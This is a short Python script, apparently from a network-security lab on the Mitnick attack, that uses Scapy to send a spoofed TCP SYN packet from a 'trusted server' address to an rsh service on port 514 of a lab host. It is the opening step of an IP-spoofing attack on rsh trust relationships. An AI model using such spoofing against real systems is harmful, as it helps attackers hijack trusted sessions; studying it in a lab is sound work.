#!usr/bin/python3
from scapy.all import *
import sys

#Terminal
x_Terminal_IP_address = "10.9.0.5"
x_Terminal_port_number = 514
x_Terminal_port_connection = 1023

#Server
trusted_Server_IP_address = "10.9.0.6"
trusted_Server_port_number = 1023
trusted_Server_port_connection = 9090

def spoofTCPHandshake():
	print("####---- Spoofed SYN packet being sent ----####")
	ip = IP(src="10.9.0.6", dst="10.9.0.5")
	tcp = TCP(sport=1023,dport=514,flags="S", seq=778933536)
	pkt = ip/tcp
	send(pkt,verbose=0)
